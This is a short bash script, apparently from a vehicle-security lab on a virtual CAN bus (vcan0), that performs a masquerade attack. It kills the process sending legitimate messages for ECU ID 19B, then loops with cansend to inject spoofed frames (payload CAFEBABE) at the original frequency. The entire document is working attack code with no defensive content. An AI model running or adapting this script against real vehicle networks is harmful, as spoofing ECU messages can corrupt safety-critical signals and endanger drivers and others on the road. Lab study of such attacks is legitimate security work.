#!/bin/bash
# Masquerade Attack Script
# Stop legitimate ECU and impersonate ID: 19B

echo "Starting Masquerade Attack on vcan0 (ID: 19B)..."

# Step 1: Stop legitimate message (simulate suspension)
echo "Stopping legitimate messages..."
sudo pkill -f controls  # Kill the controls program sending CAN messages

# Step 2: Impersonate the ECU and send messages
echo "Impersonating ECU..."
while true; do
    cansend vcan0 19B#CAFEBABE  # Fake data: CAFEBABE
    sleep 0.1                   # Same frequency as original messages
done
